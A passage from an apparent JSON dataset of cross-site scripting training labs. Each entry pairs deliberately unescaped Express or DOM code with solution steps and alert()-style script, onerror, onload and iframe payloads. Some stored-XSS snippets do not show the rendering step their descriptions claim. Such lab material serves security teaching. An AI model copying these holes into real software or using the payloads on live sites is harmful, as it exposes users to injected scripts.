            "Try SVG/onload-based payloads.",
            "Validate across devices."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/preview-message', (req, res) => { const msg = req.query.msg; res.send(`<p>Gift Message: ${msg}</p>`); });",
        "payloads": [
            "<script>alert('Gift')</script>",
            "<svg onload=alert('GiftXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in personal finance tracker notes",
        "Lab Description": "Users can add notes to transactions. These are rendered without escaping. To solve: Inject a script in the note field and confirm execution when viewing history.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add note with <script>alert('Finance')</script> to a transaction.",
            "Open transaction history.",
            "Observe script execution.",
            "Test onerror and SVG payloads.",
            "Confirm persistence."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { const note = req.body.note; db.query(\"INSERT INTO notes (content) VALUES (?)\", [note]); res.redirect('/history'); });",
        "payloads": [
            "<script>alert('Finance')</script>",
            "<img src=x onerror=alert('Money')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in quiz platform result page",
        "Lab Description": "The quiz result page reads the user's score from location.hash and renders it using innerHTML. To solve: Inject a script via hash and reload the page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Visit /result.html#<img src=x onerror=alert('Score')>",
            "Confirm execution in result area.",
            "Inspect DOM to locate injection point.",
            "Try onmouseover-based payloads.",
            "Confirm across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('score').innerHTML = decodeURIComponent(location.hash.slice(1));",
        "payloads": [
            "<img src=x onerror=alert('Score')>",
            "<svg onload=alert('QuizXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in food delivery special instructions",
        "Lab Description": "Special instructions for food orders are rendered on the order view without escaping. To solve: Inject a script in the instructions field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Place order with instructions: <script>alert('Food')</script>",
            "Open order summary page.",
            "Observe script execution.",
            "Try DOM-based variations.",
            "Check persistence across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/place-order', (req, res) => { const instructions = req.body.instructions; db.query(\"INSERT INTO orders (instructions) VALUES (?)\", [instructions]); res.redirect('/orders'); });",
        "payloads": [
            "<script>alert('Food')</script>",
            "<img src=x onerror=alert('DeliveryXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in meeting room booking system",
        "Lab Description": "The app reflects the 'room' parameter into a confirmation page without escaping. To solve: Inject a script in the room field and observe the confirmation.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Access /confirm?room=<script>alert('Room')</script>",
            "Observe script execution.",
            "Try encoded versions of payload.",
            "Confirm injection context in HTML.",
            "Test against browser filters."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/confirm', (req, res) => { const room = req.query.room; res.send(`<div>Room Booked: ${room}</div>`); });",
        "payloads": [
            "<script>alert('Room')</script>",
            "<img src=x onerror=alert('BookXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in car rental pickup instructions",
        "Lab Description": "Rental customers can provide pickup instructions. These are rendered to the dispatcher without escaping. To solve: Inject a persistent XSS payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Enter pickup instructions with <script>alert('Car')</script>.",
            "Access dispatcher dashboard.",
            "Observe payload execution.",
            "Confirm HTML location and raw rendering.",
            "Ensure it persists across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-instructions', (req, res) => { const instructions = req.body.instructions; db.query(\"INSERT INTO pickups (details) VALUES (?)\", [instructions]); res.redirect('/rentals'); });",
        "payloads": [
            "<script>alert('Car')</script>",
            "<img src=x onerror=alert('PickupXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM XSS in fitness app workout summary",
        "Lab Description": "The summary page takes a value from location.search and inserts it with innerHTML. To solve: Inject XSS via the URL parameter.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Access /summary.html?goal=<svg onload=alert('Fitness')>",
            "Observe execution on summary page.",
            "Check placement in DOM.",
            "Confirm raw HTML injection.",
            "Test alternative vectors."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const urlParams = new URLSearchParams(location.search); document.getElementById('goal').innerHTML = urlParams.get('goal');",
        "payloads": [
            "<svg onload=alert('Fitness')>",
            "<img src=x onerror=alert('Workout')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in recruitment application resume comment",
        "Lab Description": "Recruiters can leave comments on resumes. These comments are rendered on the admin view without sanitization. To solve: Inject a script as a recruiter comment.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add comment <script>alert('Resume')</script> on a CV.",
            "Open it as an admin.",
            "Check HTML structure in DOM.",
            "Confirm persistent execution.",
            "Try encoded/obfuscated payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-comment', (req, res) => { const comment = req.body.comment; db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]); res.redirect('/applications'); });",
        "payloads": [
            "<script>alert('Resume')</script>",
            "<svg onload=alert('CommentXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in file upload confirmation",
        "Lab Description": "After a user uploads a file, the filename is reflected into the page without encoding. To solve: Inject XSS into the filename and observe reflection.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Upload file named <script>alert('Upload')</script>.txt",
            "Confirm the filename is reflected raw in HTML.",
            "Observe XSS payload execution.",
            "Check encoding behavior in HTML.",
            "Confirm cross-browser consistency."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/upload-success', (req, res) => { const name = req.query.filename; res.send(`<p>File uploaded: ${name}</p>`); });",
        "payloads": [
            "<script>alert('Upload')</script>",
            "<img src=x onerror=alert('Filename')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in travel booking special requests",
        "Lab Description": "The travel booking form allows users to leave special requests that are displayed to the airline staff without sanitization. To solve: Inject a persistent script that executes when the staff views the request.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a booking with special request: <script>alert('Travel')</script>",
            "Login as airline staff and view the booking.",
            "Observe payload execution.",
            "Try image-based payloads for evasion.",
            "Confirm execution across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-request', (req, res) => { const request = req.body.special; db.query(\"INSERT INTO requests (note) VALUES (?)\", [request]); res.redirect('/bookings'); });",
        "payloads": [
            "<script>alert('Travel')</script>",
            "<img src=x onerror=alert('Flight')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in discount coupon input",
        "Lab Description": "The discount code is reflected back to the user without sanitization when it's invalid. To solve: Inject a script via the coupon field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter <script>alert('Coupon')</script> as coupon code.",
            "Submit the form and observe the reflection.",
            "Check rendering context in HTML.",
            "Try alternate encoded payloads.",
            "Confirm execution without login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/apply-coupon', (req, res) => { const code = req.body.code; res.send(`<p>Invalid code: ${code}</p>`); });",
        "payloads": [
            "<script>alert('Coupon')</script>",
            "<svg/onload=alert('Discount')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online education class feedback",
        "Lab Description": "Students can leave feedback after a session. The text is rendered directly on the instructor dashboard. To solve: Inject persistent XSS in feedback text.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback: <script>alert('Edu')</script> after session.",
            "Instructor logs in and opens feedback.",
            "Observe script execution.",
            "Try variations with iframe or SVG.",
            "Confirm persistence and cross-user impact."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-class-feedback', (req, res) => { const feedback = req.body.text; db.query(\"INSERT INTO class_feedback (content) VALUES (?)\", [feedback]); res.redirect('/thankyou'); });",
        "payloads": [
            "<script>alert('Edu')</script>",
            "<iframe srcdoc='<script>alert(123)</script>'></iframe>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online poll title parameter",
        "Lab Description": "The poll preview page reflects a poll title parameter from the URL. The input is not encoded before rendering, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Visit /preview-poll?title=<script>alert('Poll')</script>",
            "Observe reflected input in DOM.",
            "Confirm HTML context and script execution.",
            "Try encoding tricks.",
            "Verify across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/preview-poll', (req, res) => { const title = req.query.title; res.send(`<h1>${title}</h1>`); });",
        "payloads": [
            "<script>alert('Poll')</script>",
            "<img src=x onerror=alert('Vote')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in hotel booking contact field",
        "Lab Description": "Users enter contact info during hotel booking. The email/phone is displayed to staff without escaping. To solve: Inject a persistent script in the contact field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Enter <script>alert('Hotel')</script> as contact.",
            "Login as hotel admin and view booking.",
            "Observe XSS execution.",
            "Test across browsers.",
            "Try payloads with malformed tags."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/book-hotel', (req, res) => { const contact = req.body.contact; db.query(\"INSERT INTO hotel_bookings (contact) VALUES (?)\", [contact]); res.redirect('/confirmation'); });",
        "payloads": [
            "<script>alert('Hotel')</script>",
            "<img src=1 onerror=alert('Stay')>"
        ]
    },
    {
        "Lab scenario": "DOM XSS in shopping cart item preview",
        "Lab Description": "The cart item preview reads item name from location.hash and inserts it with innerHTML. To solve: Inject a malicious hash and reload the preview page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Visit /cart-preview.html#<img src=x onerror=alert('Cart')>",
            "Observe script execution in item name area.",
            "Check DOM placement.",
            "Try SVG/onload alternatives.",
            "Confirm trigger without user interaction."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('item').innerHTML = decodeURIComponent(location.hash.slice(1));",
        "payloads": [
            "<img src=x onerror=alert('Cart')>",
            "<svg onload=alert('Preview')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in messaging app display name",
        "Lab Description": "Users can update display names. These are rendered to other users in chat without escaping. To solve: Inject a script in the name field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Change display name to <script>alert('Chat')</script>.",
            "Send a message.",
            "Recipient opens chat, triggering XSS.",
            "Check if XSS executes on hover or load.",
            "Test multiple payload variations."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/update-name', (req, res) => { const name = req.body.name; db.query(\"UPDATE users SET display_name = ? WHERE id = ?\", [name, req.user.id]); res.redirect('/chat'); });",
        "payloads": [
            "<script>alert('Chat')</script>",
            "<img src=x onerror=alert('NameXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in password reset redirect URL",
        "Lab Description": "The password reset confirmation page accepts a redirect parameter in the query string. The parameter is reflected without encoding.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Visit /reset-complete?redirect=<script>alert('Redirect')</script>",
            "Observe script in rendered confirmation.",
            "Check raw HTML in browser tools.",
            "Try payloads with event-based triggers.",
            "Confirm cross-browser consistency."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/reset-complete', (req, res) => { const redirect = req.query.redirect; res.send(`<p>You will be redirected to: ${redirect}</p>`); });",
        "payloads": [
            "<script>alert('Redirect')</script>",
            "<img src=x onerror=alert('Reset')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in music app playlist description",
        "Lab Description": "Users can describe their playlists. These descriptions are rendered on public pages without escaping. To solve: Inject a persistent XSS in the description.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add <script>alert('Playlist')</script> in description.",
            "Publish the playlist.",
            "Access public page and observe XSS.",
            "Try obfuscated payloads.",
            "Confirm persistence and visibility."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-playlist', (req, res) => { const desc = req.body.description; db.query(\"INSERT INTO playlists (description) VALUES (?)\", [desc]); res.redirect('/my-playlists'); });",
        "payloads": [
            "<script>alert('Playlist')</script>",
            "<img src=x onerror=alert('Music')>"
        ]
    },
    {
        "Lab scenario": "DOM XSS in language learning app greeting banner",
        "Lab Description": "The app renders a greeting based on the language from the hash. It's inserted into a banner using innerHTML, leading to DOM-based XSS.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Visit /welcome.html#<img src=x onerror=alert('Lang')>",
            "Observe XSS in greeting banner.",
            "Try alternate payloads for obfuscation.",
            "Check for HTML context validation.",
            "Confirm cross-session behavior."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('greeting').innerHTML = decodeURIComponent(location.hash.substring(1));",
        "payloads": [
            "<img src=x onerror=alert('Lang')>",
            "<svg onload=alert('Learn')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in team chat message history",
        "Lab Description": "A collaboration platform stores chat messages submitted via POST requests. Messages are rendered without sanitization in team history view. To solve: Inject a script in a chat message and confirm it executes when history is loaded.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Send POST /chat-message with <script>alert('ChatXSS')</script> as message.",
            "Check chat history page for execution.",
            "Use Burp Suite to verify stored HTML.",
            "Log in with another user and confirm script triggers.",
            "Try variations with event-based payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/chat-message', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO messages (text) VALUES (?)\", [message]);\n  res.send('Message sent');\n});",
        "payloads": [
            "<script>alert('ChatXSS')</script>",
            "<img src=x onerror=alert(1)>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter signup thank-you page",
        "Lab Description": "The newsletter signup form posts an email and name, which is echoed on the thank-you page. The name field is reflected without escaping. To solve: Inject an XSS payload via name field and trigger execution.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /subscribe with name=<script>alert('XSS')</script>",
            "Observe thank-you message rendering user input.",
            "Try SVG/onerror variants for stealthy execution.",
            "Use OWASP ZAP to test reflection context.",
            "Validate bypass through encoded payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Thanks for subscribing, ${name}!</p>`);\n});",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<svg/onload=alert(1)>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in user-generated announcements",
        "Lab Description": "A notice board feature allows users to post announcements. Input is stored in the DB and rendered directly on the homepage. To solve: Inject a script into the announcement text and reload the homepage.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /new-announcement with <img src=x onerror=alert('XSS')>.",
            "Check homepage for announcement rendering.",
            "Validate storage with Burp Repeater.",
            "Test persistent execution across sessions.",
            "Try nested script or iframe payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/new-announcement', (req, res) => {\n  const text = req.body.text;\n  db.query(\"INSERT INTO announcements (text) VALUES (?)\", [text]);\n  res.send('Announcement posted');\n});",
        "payloads": [
            "<img src=x onerror=alert('XSS')>",
            "<script>alert('Notice')</script>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in dynamic event response form",
        "Lab Description": "A RSVP form posts attendee names, then echoes the name back in the success message. The response is vulnerable to reflected XSS. To solve: Inject a script in the name field and trigger upon form submission.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /rsvp with name=<svg/onload=alert('RSVP')>",
            "Check response for script execution.",
            "Try different payload encodings.",
            "Confirm execution across browsers.",
            "Check behavior with longer inputs."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rsvp', (req, res) => {\n  const name = req.body.name;\n  res.send(`<div>Thank you, ${name}, for your RSVP.</div>`);\n});",
        "payloads": [
            "<svg/onload=alert('RSVP')>",
            "<script>alert('XSS')</script>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in photo gallery description",
        "Lab Description": "Users can upload images with descriptions. The description field is displayed on the public gallery without escaping. To solve: Inject a script via the description and verify its execution on view.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /upload-photo with description=<script>alert('XSS')</script>",
            "Reload gallery and confirm script execution.",
            "Try variants using image error events.",
            "Use Burp to confirm DB storage.",
            "Test if payload is persistent across logins."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload-photo', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO gallery (description) VALUES (?)\", [desc]);\n  res.send('Photo uploaded');\n});",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=1 onerror=alert('Gallery')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in classroom Q&A forum",
        "Lab Description": "Students can ask questions via a POST form. The application renders questions without sanitizing HTML. To solve: Inject a script in the question text and confirm execution on the teacher’s view.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /ask-question with <script>alert('XSS')</script> as question.",
            "Access /forum and verify script runs.",
            "Check persistence using session switching.",
            "Use <iframe> or <img> payload variants.",
            "Confirm rendering in teacher’s session."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const q = req.body.question;\n  db.query(\"INSERT INTO questions (text) VALUES (?)\", [q]);\n  res.redirect('/forum');\n});",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in customer feedback handler",
        "Lab Description": "A feedback form accepts POSTed comments and reflects them back in a confirmation box. Without sanitization, attackers can inject scripts. To solve: Inject an XSS payload via comment field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /send-feedback with comment=<img src=x onerror=alert('XSS')>",
            "Observe confirmation rendering unsanitized content.",
            "Try other event-based payloads.",
            "Confirm behavior with ZAP active scan.",
            "Test encoded injection variants."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-feedback', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<p>Your feedback: ${comment}</p>`);\n});",
        "payloads": [
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('Feedback')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in developer bug report field",
        "Lab Description": "A bug tracker accepts POSTed descriptions of issues. The application fails to sanitize HTML before rendering, leading to stored XSS. To solve: Inject a payload into the bug description.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /report-bug with description=<script>alert('Bug')</script>",
            "Access /bugs to view the report list.",
            "Observe script execution upon load.",
            "Check if payload affects other users.",
            "Verify storage using sqlmap or Burp."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-bug', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO bugs (desc) VALUES (?)\", [desc]);\n  res.send('Bug reported');\n});",
        "payloads": [
            "<script>alert('Bug')</script>",
            "<img src=invalid onerror=alert('BugXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online recipe contribution field",
        "Lab Description": "Users can submit new recipes using a POST form. The recipe description is displayed without sanitization on the homepage. To solve: Inject JavaScript in the description and confirm execution.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /submit-recipe with description=<svg onload=alert('XSS')>",
            "View recipe listing page to trigger XSS.",
            "Use Repeater to test alternate injections.",
            "Try <script>, <img>, and <iframe> variants.",
            "Confirm execution across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const recipe = req.body.description;\n  db.query(\"INSERT INTO recipes (text) VALUES (?)\", [recipe]);\n  res.send('Recipe submitted');\n});",
        "payloads": [
            "<svg onload=alert('XSS')>",
            "<script>alert('Recipe')</script>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in error reporting module",
        "Lab Description": "The application shows raw error messages from form submissions. When invalid data is submitted, the error is reflected without escaping. To solve: Inject a payload in a required field to trigger the XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /error-demo with name=<script>alert('XSS')</script>",
            "Observe validation error rendering your input.",
            "Try breaking tag context for deeper access.",
            "Confirm rendering in <p> tags or other containers.",
            "Use onerror or onmouseover payloads as alternatives."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/error-demo', (req, res) => {\n  const name = req.body.name;\n  if (!name) {\n    res.send(`<p>Error: Name field is empty - ${name}</p>`);\n  } else {\n    res.send('Submitted');\n  }\n});",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=1 onerror=alert('Error')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in fitness app workout notes",
        "Lab Description": "Users can submit workout notes via POST, which are shown on their profile without sanitization. To solve: Inject a persistent script in the notes field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /add-note with note=<script>alert('FitXSS')</script>",
            "Visit /profile to confirm script executes.",
            "Use Burp Suite to check stored payload.",
            "Try encoded versions for filter evasion.",
            "Test with different user sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO notes (text) VALUES (?)\", [note]);\n  res.send('Note saved');\n});",
        "payloads": [
            "<script>alert('FitXSS')</script>",
            "<img src=x onerror=alert('Workout')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in travel booking confirmation page",
        "Lab Description": "A travel booking form reflects the user’s name in the confirmation message. Input is not sanitized. To solve: Inject a script in the name field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /book with name=<svg onload=alert('XSS')>",
            "Observe reflection on confirmation page.",
            "Try <img> tag variations.",
            "Use ZAP to verify injection context.",
            "Test HTML entity-encoded payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h3>Thank you, ${name}, for your booking!</h3>`);\n});",
        "payloads": [
            "<svg onload=alert('XSS')>",
            "<script>alert('Travel')</script>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in grocery app review comments",
        "Lab Description": "Users can leave comments on grocery items. These comments are stored and shown to others. To solve: Inject a stored XSS payload in the comment field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /submit-comment with comment=<script>alert('Review')</script>",
            "View product page to trigger XSS.",
            "Check persistence via different users.",
            "Try <iframe> payload for alternate execution.",
            "Inspect HTML with DevTools."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (content) VALUES (?)\", [comment]);\n  res.send('Comment posted');\n});",
        "payloads": [
            "<script>alert('Review')</script>",
            "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in library system book description",
        "Lab Description": "Admins can add books with descriptions. Descriptions are rendered on the public catalog without sanitization. To solve: Submit a malicious script in the book description.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /add-book with description=<img src=x onerror=alert('Book')>",
            "Visit /catalog and confirm XSS triggers.",
            "Use Burp Suite to monitor payload storage.",
            "Try other tags like <svg> or <marquee>.",
            "Check behavior across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-book', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO books (description) VALUES (?)\", [desc]);\n  res.send('Book added');\n});",
        "payloads": [
            "<img src=x onerror=alert('Book')>",
            "<svg onload=alert('Library')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in event invitation form",
        "Lab Description": "The event invitation form reflects the user’s input back in the confirmation page. No escaping is done. To solve: Submit a malicious name to trigger XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /invite with name=<script>alert('Invite')</script>",
            "Observe confirmation page behavior.",
            "Try encoded payloads to bypass filters.",
            "Test reflection with DevTools inspection.",
            "Confirm execution without login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/invite', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Welcome to the event, ${name}</p>`);\n});",
        "payloads": [
            "<script>alert('Invite')</script>",
            "<img src=1 onerror=alert('Event')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in student portal report comments",
        "Lab Description": "Teachers can leave comments on student reports. These are rendered for students without sanitization. To solve: Inject a script in the comment and test across accounts.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "POST /submit-report-comment with comment=<script>alert('Student')</script>",
            "Login as student and view the report.",
            "Confirm execution of the injected script.",
            "Try <svg> tag injection for variety.",
            "Inspect rendering DOM context."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-report-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO report_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('Student')</script>",
            "<svg/onload=alert('Report')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in restaurant feedback popup",
        "Lab Description": "Users can send quick feedback after checkout. Feedback is reflected in a modal without escaping. To solve: Inject a script in the feedback form.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "POST /quick-feedback with message=<script>alert('Food')</script>",
            "Observe feedback rendering in modal.",
            "Test encoded and double-encoded versions.",
            "Use onerror and onmouseover payloads.",
            "Confirm trigger inside modal container."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/quick-feedback', (req, res) => {\n  const msg = req.body.message;\n  res.send(`<div class='popup'>${msg}</div>`);\n});",
        "payloads": [
            "<script>alert('Food')</script>",
            "<svg onload=alert('Popup')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in portfolio builder bio section",
        "Lab Description": "Users can build a public portfolio with a bio. The bio input is rendered using innerHTML with no sanitation. To solve: Inject a script in the bio section.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "POST /update-bio with bio=<script>alert('Bio')</script>",
            "Visit /profile to view injected payload.",
            "Test various injection formats.",
            "Use Repeater to confirm persistence.",
            "Confirm DOM-based trigger via DevTools."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  db.query(\"UPDATE users SET bio = ? WHERE id = ?\", [bio, req.user.id]);\n  res.send('Bio updated');\n});",
